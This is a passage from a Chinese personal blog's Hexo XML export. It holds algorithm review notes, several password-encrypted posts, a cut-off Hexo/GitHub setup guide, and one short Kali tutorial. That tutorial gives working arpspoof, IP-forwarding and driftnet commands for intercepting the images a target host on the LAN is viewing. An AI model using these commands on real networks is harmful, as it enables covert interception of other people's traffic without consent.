01bc932e9141fe3120b89cdfaf691dedf098f0d887c83e324a7866627f087b2e52b36f3b54ebba7745d44c0b9817d3719d60a0e05a2c3e6b08cbb3f12490530f0b7fe10cbec825ca4ed61a9fc7404f783c9c7a6a665b1007ca28427d05ab25e94ae7ff4e4cdd0773cf47a96dda1b47cf0e0f607f741a5f141d26b543e530bb39b9540dd49b629d6b881cdfe2318557367c844ae4f9825b128dca6a77b8beb7f0bcc7bf91e3127b3e25d7c7f1c4e609ec3db7173c93ab70bd3bb7615a625584e6bdb80e7d48ee7e0d21e4580e673d838253196f79df4993a445999747cc3f7ec23d5f51d22edd5c7a7eda328c03141ca6d00e34834594cdfe6c94ae42819ff35e2bf7588a224aa86e099459caa511cb8de81e3df2c1cc8cb11f83f1c6ee1e5ff1baa0f83d8e69d62517e2f816117e39e247d872a7466262ba673469385620fda19c355683ddaab6f4aba30888e088d163e5ba7e34689a9ec3e0b6e1a02fb235bc94a4954f357ab67142cac4f741ccd3697a3c96434e738f219666bc15c86f773e8e752725405b00693e1bd2a909bf8c4b5fb1179d1fb62ca666b5e2d804c5771adace5a22ffa83c30291d10a906276c1feecabc2abb4649d0fb78cf30bd49f3a8bb41d4a41fb97ed357e63bfa04d1535d2f33fcdc606179fa406fa11b3ef5c7ab804715e29609c2444c8c06de244985318ea7330594e76d8676c77d7732a9b473899b95ab628eeb2e903f8dd62082eabe959848ee650cf082ef32303daa656ec43ed6b156053c3776415a26799e0d87112f5dadd87c18c353693c45e285bc626260a675da54d9ea3261881f75f68790dbc4353cbd66d2983c6aac463432675ca99368dac578575c2f308bdbf77a9daabff7535040da8d08801ae9ad3bcbb990d62d680398990e81be3b92529ffecb2841774cbf38733fa10854138e26a9e1b6b731f7edbf33609a0e0173a003c4ba685efd1f3354cf2007b011aa9653c1aaa43fd0e839a0831ead541943d961554e9eceb0f2a2a41d3d4359bf2893a10656b7dee3908c88d45233a3f45477551d74574c462f4fa4a1b8247d1f3e4647db653f6bad4fd104bb579434116ebcddcc75c7f5b3d714daeef9356c751e60c4ba6dd982f603df32a8b92075cf22939f6fdd82813fbe106eddfb5cda5ec2b2fa9dbeed97a3edf1b5f8272e8c4b25985cbf134a792f9d6f2dc08fc470060d293d9f45d4022ee76d816d368d96dbe48709b590f1145faa878ccd04744d44ee37e2b2384a138151cf27a0b6ab9245f4eea6f6c26caaa2d1ba2bf29c85465edcf4d335f83dba75088056550e347c6dd104f76999eb924311d340da915ebb7a20e73ea721524cd994ca72518754e4948beff4ff189dccaab14b8745d90028d4224136a0f86b38d3add449dbd8735e298c47d22c4251fa1b4fa83920355c5a7d2699ee7312486804a7fe68a57a715533f69e05cbb05381d70a40ebbda66f134e9816acc66782e942e50c58013b370c74d725623aca8596a99bee9b388878764d79cac8bad9513a3daeff68ab86b9d42575a99a3920bf2fff118dc11c8c8b770104f35e82de3c474def2c6dd1cc86aa3392efb70e7d6f4d5206a83ab08000466d8b89a71aeb79853b9403e4fd34ae2775125091114861d965d3717cdd801d20de67d80fcb1f370bbe577eef9233891bad8d521a390856af8c9ecae1d236a1a842d0db87b52653c6ffbae0f3f5c5b2971b01141d19aa707fb542f771fea1299c41d9aec0795aac45f0b39b348206ac9d3919385a965f14b814a96ac05657d1402b560929d8bbca6bf7520fe0a04aa7abc955d6c993672eb9d4653e71bd640467cc3b3ce426ee3d312878b95da286654a27b2a78ced09072065fc9c0c176621457382e75</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>XAMPP-DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>算法复习笔记</title>
    <url>/post/algorithm/</url>
    <content><![CDATA[<p>&nbsp;<font face="楷体">11.19复习笔记</font></p>
<h3 id="二、递归与分治策略"><a href="#二、递归与分治策略" class="headerlink" title="二、递归与分治策略"></a><font face="楷体">二、递归与分治策略</font></h3><h4 id="1-递归与分治"><a href="#1-递归与分治" class="headerlink" title="(1)递归与分治"></a><font face="楷体">(1)递归与分治</font></h4><p><a href="https://s1.ax1x.com/2018/11/19/FpNSaQ.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNSaQ.jpg" alt="1"></a><br><a href="https://s1.ax1x.com/2018/11/19/FpNp5j.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNp5j.jpg" alt="2"></a></p>
<h4 id="2-二分搜索技术"><a href="#2-二分搜索技术" class="headerlink" title="(2)二分搜索技术"></a><font face="楷体">(2)二分搜索技术</font></h4><p><a href="https://s1.ax1x.com/2018/11/19/FpNCPs.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNCPs.jpg" alt="3"></a></p>
<h4 id="3-线性时间选择、最接近点对"><a href="#3-线性时间选择、最接近点对" class="headerlink" title="(3)线性时间选择、最接近点对"></a><font face="楷体">(3)线性时间选择、最接近点对</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2eBt.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2eBt.jpg" alt="3"></a><br>&nbsp;<br>&nbsp;<br><font face="楷体">11.20复习笔记</font></p>
<h3 id="三、动态规划"><a href="#三、动态规划" class="headerlink" title="三、动态规划"></a><font face="楷体">三、动态规划</font></h3><h4 id="1-矩阵连乘"><a href="#1-矩阵连乘" class="headerlink" title="(1)矩阵连乘"></a><font face="楷体">(1)矩阵连乘</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV23cj.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV23cj.jpg" alt="4"></a></p>
<h4 id="2-最长公共子序列"><a href="#2-最长公共子序列" class="headerlink" title="(2)最长公共子序列"></a><font face="楷体">(2)最长公共子序列</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2UEV.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2UEV.jpg" alt="5"></a></p>
<h4 id="3-最长子段和、凸多边形、图像压缩"><a href="#3-最长子段和、凸多边形、图像压缩" class="headerlink" title="(3)最长子段和、凸多边形、图像压缩"></a><font face="楷体">(3)最长子段和、凸多边形、图像压缩</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2B34.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2B34.jpg" alt="6"></a></p>
<h4 id="4-电路布线"><a href="#4-电路布线" class="headerlink" title="(4)电路布线"></a><font face="楷体">(4)电路布线</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2yuR.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2yuR.jpg" alt="7"></a></p>
<h4 id="5-流水作业调度、0-1背包"><a href="#5-流水作业调度、0-1背包" class="headerlink" title="(5)流水作业调度、0-1背包"></a><font face="楷体">(5)流水作业调度、0-1背包</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV22E6.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV22E6.jpg" alt="8"></a><br>&nbsp;<br>&nbsp;<br><font face="楷体">11.21复习笔记</font></p>
<h3 id="四、贪心算法"><a href="#四、贪心算法" class="headerlink" title="四、贪心算法"></a><font face="楷体">四、贪心算法</font></h3><h4 id="1-活动安排、背包问题"><a href="#1-活动安排、背包问题" class="headerlink" title="(1)活动安排、背包问题"></a><font face="楷体">(1)活动安排、背包问题</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV25gH.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV25gH.jpg" alt="9"></a></p>
<h4 id="2-最优装载、哈夫曼编码、单源最短路径"><a href="#2-最优装载、哈夫曼编码、单源最短路径" class="headerlink" title="(2)最优装载、哈夫曼编码、单源最短路径"></a><font face="楷体">(2)最优装载、哈夫曼编码、单源最短路径</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2LUf.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2LUf.jpg" alt="10"></a></p>
<h4 id="3-最小生成树"><a href="#3-最小生成树" class="headerlink" title="(3)最小生成树"></a><font face="楷体">(3)最小生成树</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2jPS.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2jPS.jpg" alt="11"></a></p>
<h4 id="4-多机调度问题"><a href="#4-多机调度问题" class="headerlink" title="(4)多机调度问题"></a><font face="楷体">(4)多机调度问题</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FVRurR.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FVRurR.jpg" alt="12"></a></p>
<h3 id="五、回溯法"><a href="#五、回溯法" class="headerlink" title="五、回溯法"></a><font face="楷体">五、回溯法</font></h3><p><a href="https://s1.ax1x.com/2018/11/28/FVR1IK.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FVR1IK.jpg" alt="13"></a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>台儿庄古镇</title>
    <url>/post/ancientcityoftaierzhaung/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="3896c139eec4e202974aef1b5e299f7668c8765a9c22ec55812fbba47b66b9dd">4f9bdd97090042829d4e8d624a306d5e4072bf6dfea7d0ec5faca4269776bddbb08eb2cc14439385e4f14b5d669cb3fb9cb02c0deea0bbc1d0bef8678578835af87dd559e80a8007a14101ad59c165cccd43ac9bd68f0d6c67c9ee97ce9ff8b112e051d8a8c9119e5b4e7aa61cb8fd048543aaf6e4452ea2b27e8cf99ffa1f6fd99760fc02d51f88e851ac44230b947b53b27e5d3856e049c0e8d4c63388bdf9318e2e14d5d12a5576de7ff9a2f1e5107a9abe356756b6a5a6804e96864affd7e13c91a730b0b3611c25edbe4ba890d22ce34e45a45b952f26bb01fe11c587c963ebd8bc6ee10dfa2183da1e0ff437541339d63f5188185e4344d88409986409a373797dd4a930a2cb6d577e6ce6a99779c51cac27748502683202fd9214721bf55d71e718b2e08c04e90fec6e4095ab105feafb91785b83809886618f6a55b0fa74d7ac81a375871ba15dad61a7c9024d3f9296ab4607748e81e4dd08ad8444f795c04be90c44dfe0097eed1ca6f0dd2644391d5707f83560afbc7126b82a83c6c3ff6361bde664a146296594826d254a21bca0701aeabdad1fc9bee509df2415200f043c283a0744d376c29f1856779ed4f6ccfc724e1b6a8d53ae63472cba5deb5c5ba7e448877d7debe2388e93b3f832018a45086741a659add198f75a2271c5b4a95627996d4dc8e91b90c3da8117bd3ade0600e531436fea56bf80f02ab029a70d8d8228ecad18671af753f732f5e379ef5f7c876f16f18325dc7d4e245c65c9bddb2710c67f56cb5e4992e8c5a6e3f7d87514d837383aeb56c6ed9aaaea3b7406c40b2e33467ecd7aea59b7c5e78920c2bea6e25b5361369ded73b562f792076c7c8c17193108eb1816664504b27de0ee8887cd0e88a90310146a29a922852cf7d4f48605e0c47e0c847782c3364c882311f8760cb24d625e9807ee4e53030f6d8462d0ac9f3bd01a36fb772ec91f74585a381f38a20c4cbf8bd36638c00222f07c1ed78fad3971d4680819415f8278a723954c65090d43f870f6ac2dcad1721bc7b867982d8dbe535779d98213437ab3165b11f74090886c685b4742be3ca8c18acf520f1d4cdef93bd6e1f8ade71084647bafa88c8463585e20d6f4ce94b9b11ea11b4a3e5cd1f15ac35f9f165d7fee85a0bf9f38927115ed546b8a694859576cef6cbc10fc827fe48be2148ed3e596a402b4159a1eb54458cb0863637a033addeb075b40bede5157a530d82d3b60a4443acb4c13bbc82082dbbd93fd58efa2f672469d148cb72c9f7d9d1a5c9eb22d601e210810d642dc806afa4bd34905660096af1ec8ec5b3edced45285d431e242850fcf77e270997e2564211e50d7171b8b34c0947faf076a1dd23b100c9276c22f6311cd9435037e4e96a33a38ff6338cc5550e947923734c506cce32602200b2fa7d9d2ec4428d5a4f0b6ed558ef05affc4dd5b2e47f20b54e7237da98bab45062950aeed39cb6211ababd9d8101a21c53de3c37cdff342e9b3385feeb1688e214a5b1459c5df8da30c4866a1a9c5d782732bf5e34959ae7b5c6bfb56a24027bc4d810c70a69fa2f33b8af788b75e9e4cf4c33b6992a0524ed82c202a22998568a09d7aa2544ae14fb769de50b081141a8d6a6dae10528f7edc5463f674e6b57adde42da24e3ad36b3d2c571124e5eef294dd2600cbeff2650effa00cbba62435c6245a60be9416bc67aebe09433b10e907caf370f2e79c2db48479b6b73298de5d7d82804d76df3515c9b2d0a40590594389d3507078e177b40118894760956c0581b4ee007e09825e480edf76f8ee2e1a88ec4442912e9fb7ff3b84933e12da903d676820d63d63ba2118e21ec0447c836345219a128c752c151686e26a9f1f895b62fabef47b3bb5c2f64a0565af1085f4b24027b178bb80f2123589c2f971dd690523572d27dfedcbbe167a347ba8c072e166cd1a2eb3e050e2dc0f05a1a5a2e9e504a814f76a8ab92432b8eea70d2ccee9185199b6992c0eb36fb391b5213a996d7aff615a7654898e0d9178cfa8d7477f7b023c4ee6a4bb5a91e4d7e2e542499f1aea98d7e538e4a7eaad3cb73d063db534b1a7207069d6a781f3337db31f98da80a7ee6101a810bbd98551244657d8d4d979ca6c23a90085190df9ab7184d623136f8eafc80f270f1f91c5cfb666214eb055376e062cb6d95dbf558c8d5d33059dadbd6e1b65c7af43d6e18e3e705e0c5168277ebc47e3c8eebf7f7bebbe229266272b94ba5ef26f8b4474037cb686be4f24225b4c32a8efb148141b27267443ce937472a635248b81c650fc63ff3c7b113ae3638e7ae5d9f061a7901d79b1fb890d1ebf934a9c50879df6a17519a72990b4772e0f3372f1974aa437921d438b2f4bc3033e1d36efe52ebf497c15198c8ab6bb925d553c5e95901a7146b342a779bb4e73ab569ececbfd5ff8b328b5626366c9c246b4e9d5a78a405b8fba48ee51b4cfc9df2e23ce8bbbe0ab6227bc3ebd7f1643139cedff81920cf5d981ae49786d9779ada515d266577a31d889c9eb931fe3cf389091c8a52634bec2e19be0af2c463c85675daeb04c172fac18fe12f1338719c8bf9b2bd0a3cd1e9a0c0884d125949dd426999f4901e445af4009d50ceb4972f8799b40db4dc7362688f07858bb1944cd623e5aff7a7a2c4c58b095432d91e9569edad6860db99bb573cc74337e78dcc843b7a2222def4cfafbcb234af44e44b628c9d492e3090feef075af2427c1c710a8cfc04ff3babf021e751e0fadbc6af7461e3d654c5e0843f24001c1769e59de5a39366ac1d97d4aeb23a07a19fb78982b685f585355aa3c978a428431596a1d3ce66dd807a08d14ca22b33967fc9d0a49b5db5770fd7ac8858a482b309c3dc3007eed6062c6598472544a1968514bb54d2df29655fe503c471d87d7cb09f3d2fe56185bfda97713124da3059f0c2f05110d6c44ed60198fb3577d2b7a3d7ad66a7f5a27dbe13a59acd0a3074f31ba79f4e9fda4a42e4c19d6b35fcb9535f777e6f58a1eb89bac6f98d1df959d720ba6e5fa5</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《arp欺骗获取目标主机浏览的图片》</title>
    <url>/post/arp-picture/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、driftnet</strong><br>&nbsp;</p>
<h3 id="一、ARP欺骗、流量转发"><a href="#一、ARP欺骗、流量转发" class="headerlink" title="一、ARP欺骗、流量转发"></a>一、ARP欺骗、流量转发</h3><table><tr><td bgcolor=#D1EEEE>第一步“开启ip转发”
命令:echo 1 >/proc/sys/net/ipv4/ip_forward        （回车没有任何的返回）
第二步查看转发是否成功
第三步另开窗口“开始欺骗”
命令：arpspoof -i eth0 -t 192.168.1.10 192.168.1.1        （回车之后不断欺骗运行中~~~[记得这个窗口需要保留]）</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.10 192.168.1.1</span><br></pre></td></tr></table></figure>
<h3 id="二、使用driftnet获取图片"><a href="#二、使用driftnet获取图片" class="headerlink" title="二、使用driftnet获取图片"></a>二、使用driftnet获取图片</h3><table><tr><td bgcolor=#D1EEEE>命令：driftnet -i eth0（获取的图片会自动给保存，可以看它新开窗口的保存路径）
“查看目标的图片信息”弹出的窗口请不要关闭，在窗口就可以看到获取信息。
</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈 C 和其他语言</title>
    <url>/post/c-grammer/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="2019568f4086ed6c52e4e31c9065243613900db54072a48843ff9392ba4ec6d2"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记</title>
    <url>/post/column-1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="2fe7e5a2ba6b79cf3ecaf119bdf7ffac391a2780a9c0ec35d5a93b76ddaae808">e28f8ff79984e3df63dbd7e3bfb6a3fc3f5e028c884bc01e3b4cfcdd4a188852559d3d598e23001877aade8b767d389c724070553c6001ba1bb628788e8b13b91de0ccd366fd860d02374f983cdedca637272b961fef9c69c630ae77c3435ab3c62436ab61b814274b44eef176485fad244b014c4b5bc76cb1f5323383727c5a174fe994babddec063326d8e70027c0d682c50fbae4358e01cdff7f0f4a0e32878265a9fec7842130c13f847f78f9e8e981e50d4cc433a75a548c692119d42a1c37b00e79746636734917a288bb3909a02c03ffe392602a5b6721bb92f0f76fee1b07f092bb084f48f4a31c99a10810378933339f1aab53d5c5223cadd3c577243429341b44bf9ee5e158922f49e6872f68c0f9b0e2b90444d9bae8ffc4c72deb0df7114055748191eb52ee5dddd603e7304883348a09ef1d192ff309ed2927f78157dc3f5a7909d055118ea9bde53ca63f64939731962b0d595b67e83f5bf551252cc11cca92407820fe5a91dc9e9847da0883b5ccc1735cf15e2276731779e56cf5a6ebe8e876231bb2d141d6137f46d8b86b8f5ec000bd9704e3d44616e2082ca7bf8d5b243d483f8fda7b106635e1bc986f03fe1cfcd979f7b8170b5b1d60d98c9071b4fc377c6eeef9e13653b12f4833b6faec62c955491467646f2da1dd902182bddd532c9bf788390098835e738066ff03832f550104ba23acda20dba3f478929e710cdfd1a6a3d957cf7c7e443fcaee4ade1d94ea6f559e6e216e662596e184e023d3748b8318e92a679755941192036e25e922b5cb03dcea7d921e355f5c0d7b1efa71c6444e608dd0998a8a9317ab4946b99b20c6095d2ed58a670b3c9daf2a16c5958db6704e3a354ffd0c1bd200f23838d2dd07681004ef7ff8806c81542fcbbb188fb6256162ffb92a128f5a2ace41ae0868ddf81e11767fac25a6ff35ff5fad13aba3a87b7ddd5bbbdc4facc3887f0f02c775f4faa1544a854f74d70414b127d39cdefb9c6dc74d9de7c853271404ea0e1f296b15d5f9bad0069c7a332caa7115d53c6991826968abb043943e94285c6273d1243bce2633b150acc2e8952f0e19d2d2d528d2d529a535ee4f8a1453383b3344cf05e0ffeae60bc0cf96c1a36c1fd00670c69c84bef0cdc01c45b964bb3a811bfc4869318ad87d5d0587947782b2d601e66d09c4a3f5b8653ae329c5172f47e3d886992b11f6b9026c0d7bf305e2a9d9770c505284d3e100a6dd994fec70c491026f54249270d1fb6f4a0970376d11e7a4276477ce4015c5b3185fe3420079a623ec438fe3711393f43038f8d429abbbc621ac77f662bee64d152f31ad52124876c9825b59895d8dee3493bb2a0ef5d5c74f8e257c6a37d37828191e360bef635337a87e33c0d1066ae402ff2fe000e5ac23a780e054f156df2ba9fc91061e628273794c2dad63de8b6f1b7d8117d720cd01d236e461f3f92daca98ada00d3c16b18941b778d0359f7609362a953cceaf085577ab28b488f21abc558b8e1acc6b5b8eecd0c7e18205fb475e6ec0769a8ba22d9adf7e152af7ca3746b808a0c7537de92805c8a428dea00310a1df80f666cc92dc13e5a4317a7bc375993f80fe7945a1a1bf4232b9ce35529325de990fde3fd9a949438cd37df908b76c05c626c3bf193046cec00d25232be25622f06cdf5121adf3a564aa47f0e97b0199bfe7576cda3732c5170801a022a72bddcc911b61326424ea8b662dfcd55e74ce5c5b8291877fb35358b97a3e99eb5c4ec0a1922377e0653a69eee8df0489700ee2baaff70ef29143ea610161e135811cc98b37eb4df8dd1ad1f105d207141b0f34f5a1745defe4c6f4228447454957cd47ce17e375d1418b86c861b01202d7841d93860b50e6768c0aec2718cfe0e7dda70a0efaef57c4ee58da14f25f6c7700f2b95c6d09f31bd5f63662bc658fcd56606460ddb86658b5f4b28e07243cb7a5220bea6d274abb7b6e330058699ca34d513c6bc5e97c04e485454f8ed059eb4e7891b5c9e3120b6b997930e3ad1b9fba464d9e089272007dd4f24502e32d42cee11426aa77f731687771265904560f32bc907980e1ff5b67f223726f1e49c7fab87360e0980b02657ac7d19508f0f078f77b0c01cd3506070127662b0ae115e9e8ada0fa2097325123b5e93972e44a37a2f8914825c048244dc60f7829d036e9f98f6a5d4f390c9bfc6e14e4a86023c84adda56ca0bf551ca10e726c57d8e450f379db2750d5b42a0c2e3b0e1cdbca455cf299cd177ce2dc03f3b376c9f18eb1ba877373212ea65b7a24ec0e8ab10030a3565ec8e5297121e64cec6d8488f13beaeb4ba7492f13fdcb6f972184bfe2c03323c3a573ae6dbec727d2e60d1f72146c70c007cd24cbd4a2b9121a697a57c5c5a653ad7f7ae284dbcb400abf244f31e62125eec7c9a0e3b95774f55bbd78ad6349cca8c7edc9e39201153fc986d0d9305afdd326a45cdf37e77d03212a3b903bbeaf1b5b86510ea66e9502a265f5dc44e5cdbc681ab2edc5628b85980cdd86cc09855060f4eb9f8353fb6ecfa1f06f22e7abe3a6a539dda4437d4fa77a10a9e54a39298d23614c12ef690dd046b91bfe35c448b7c74fd08080c1224ce46d243023c21d02c69982014ea98fedb97cfed840a11d6de96ee959ec52aee75020edc2aa4df681618c69e8b012f9ac1deeff55233b41492d7e9a6fa237de1c15dafddce7ac00e1019b1260e7eca7a50d60ab2ac24351594c02f13bfbb7aeb28fb18777327c84c50325cb8a30a7638325ceb605f2213f838b9c7ee089bd5b703dba7637e8482f93a040dfb026913ff7d3e4e82a54752426011466edfbb9e78ed8b0f72bbf889a00d4f141036398383a2605e4c21263fa6f3544bc86d9cb2cb12719e01b01d6fec1e6b3437765f470e44af76b9532d18d46e9e5a30d1c39c2d18820edaf21c0b5fe0f078783cc8afab0213983181094d6700b156389c12237729fc539a08168c95edab9c9590d7c93d350e4144b2abc1f33e7025986af39115d26722d0b797d41519ae33cfcfce05136c29734871ae7cde4bce9616bd7f8b61a37f0c00f46aa48679a0ba17530966e7a97824c3eff65fa1a6f91fd02d46ea6f69844b0d8972fe24a46c6c2d77e5f4a6357cb17a46d9bc09ff0c10e35cbee94d9c3fedddd117daefc83fbbe4ce615962fc1a75f763215714446fece6ac1a30baf60da437071d92a216d1729d07ddccf85b3738462a0aea1697cd0ded00a78c65855e4d515c68d3a5a7a5115457165e010497b6caba41593d8eb09974ff58959cc1892282ada034b06fd8f636887056e4f447ee3c392b0a003f8ee1310c08473e4ecb79c84fb3c81793b7c46813e192c89277452ad4ee0ba396ebd66939a6a7b6b21c1def44f6b15847e7db7660ef6b1be991ed44d22c6724083704a1e81c9aaa5e7f64fdb00a7b81fe3ad0250cf876607bf4fa4405d2776e53f22d2a8be9d2d05e71b77853bd5253cfc3e308c27aacb6dbc299e9ab436b11638fe3c563c5d0b7fecf59857f566136c2516a2aaed41bbc3dc9dc6fd96210aa3227058effeeda6bf2b4942d9af43e9f6b0a15613f6873e17f5d5367de14cff980797bc27060863c3f4a35c6e34410390c5460c7efafc422a793f457f355e2d76a4a90436f6035bb2a8a7e6e34dd285c425bbb9509619e70b226f13a6011a7ccf62f42d19b92c8dcaf56b0883a44d05a912ea8e1ed2f63b18783d0fc02eb49895f4c5507f2c7fd5a6aca8ea41bb5d319db659e9a4c0fb314d430215ddd1415e66bf7d86413ad1f8a982b5c8212b58b0a1c11055d870a356de7c2fa96ec929a33282edfaab97c5119c678665e150ba5ccae255241fc05a948220fff660b8a4aa88184b7830f98eb12c20695ec14f0ad8dd0fab275b5d42b672f2f5a9f63a7d5aada502a1bffa356b76540352fe3cda84649ea3d3ac6d817fd31b164448e43b9315256d6f6ab58e5b46f3ee163f751ca3958758fa5534fc662914c4191d670034612e9206ed522a50e746c61e1aa2ed7abe6e927e66e5432a1ac1e86a12de96ec6f3947b164</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Github博客搭建终极大法</title>
    <url>/post/createGithubblog/</url>
    <content><![CDATA[<p>2019.2.26更新<br>最近有同学、朋友问我详细的Hexo+Github Pages Blog搭建，加之我把我这几个月来的一些使用技巧和方法总结一下。为什么要今天来更新一下呢？<br>因为26对我来说是个特别的日子…..</p>
<a id="more"></a>




<p><font face="楷体">边听边看吧😊</font></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=32705017&auto=0&height=66"></iframe>

<p><font face="宋体"></font></p>
<h3 id="一、-前言"><a href="#一、-前言" class="headerlink" title="一、 前言"></a><font color="#FF6347" face="Comic sans MS">一、 前言</font></h3><p><font face="宋体">&emsp;很早之前就想到要拥有自己的一个个人博客，最初想到的是CSDN，除了会员，无奈广告太多。接着考虑过博客园，但是不太喜欢它的UI……最终经朋友推荐了Github博客。经过大致几个小时的Search关于Github博客有关的东西之后，发现里面的背景、字体、高亮代码等等的所有东西全部都可以DIY，对于一个喜欢美丽事物的我来说确实喜欢上了。好了，话不多说了，接下来谈谈建立这个博客的辛酸过程吧……<br></font></p>
<blockquote>
<p>要有一个良好的使用习惯，包括但不限于：</p>
</blockquote>
<ol>
<li>写自己博客创建方法。博客搭建好后可以写写自己搭建过程中遇到的问题以及解决方法；</li>
<li>解决报错信息。初次搭建博客的过程是很麻烦的，特别对于git的报错，或者是hexo安装过程遇到的一系列问题，我的建议是：将报错信息复制到Google或者百度找解决方法，或者将错误截图和原因告诉已经搭建好博客的人，请教他们是如何解决类似问题的；</li>
<li>创建更新日志。为自己的博客写一个更新日志，内容可以包含：更新内容、时间、原因、目的、方法，以及更新过程中遇到的问题是怎样解决的，这个习惯非常好，以后能非常便捷地帮助自己了解到博客的变化，以及自身积累的一个过程；</li>
<li>初始创建好博客文件夹后可以复制一份保留好，以便后续可能使用到(极大可能会使用)；</li>
<li>站点目录下的_config文件可以多复制几份，但是要方便区分；<br>……</li>
</ol>
<p>&emsp;<br>最近我重新又搭建了一个博客，实现了一台电脑搭建多个博客并部署到远程Github仓库。<br>但是这个过程也是非常痛苦的，因为网上的教程我几乎都试了，但是没有一个是成功的……下面我会分别谈谈搭建一个、多个博客的详细过程。<br>前提是第一个博客博客要搭建好，其余的就非常简单了！ (。・∀・)ノ</p>
<p>&emsp;</p>
<h3 id="二、-搭建第一个博客"><a href="#二、-搭建第一个博客" class="headerlink" title="二、 搭建第一个博客"></a><font color="#FF6347" face="Comic sans MS">二、 搭建第一个博客</font></h3><h4 id="2-1-搭建方式"><a href="#2-1-搭建方式" class="headerlink" title="2.1 搭建方式"></a><font color="#3CB371" face="Comic sans MS">2.1 搭建方式</font></h4><blockquote>
<p>Hexo+Github、Jekyll+Github</p>
</blockquote>
<p><font face="宋体">&emsp;至于使用哪一种方式，网上看了许多帖子、视频、博客……大部分是使用Hexo，后来自己网上找了许多原因，发现Hexo官网提供了非常丰富的主题和插件，加上好维护，最终我选择了Hexo来搭建。</font></p>
<h4 id="2-2-搭建需要的工具"><a href="#2-2-搭建需要的工具" class="headerlink" title="2.2 搭建需要的工具"></a><font color="#3CB371" face="Comic sans MS">2.2 搭建需要的工具</font></h4><blockquote>
<p><font face="Arail">1. 安装node.js </font><br><font face="Arail">2. 安装Git </font><br><font face="Arail"> 3. 安装Hexo</font><br><font face="Arail"> 4. 安装Hexo依赖</font><br><font face="Arail"> 5. 安装代码编辑工具，推荐Sublime Text(官网下载)</font></p>
</blockquote>
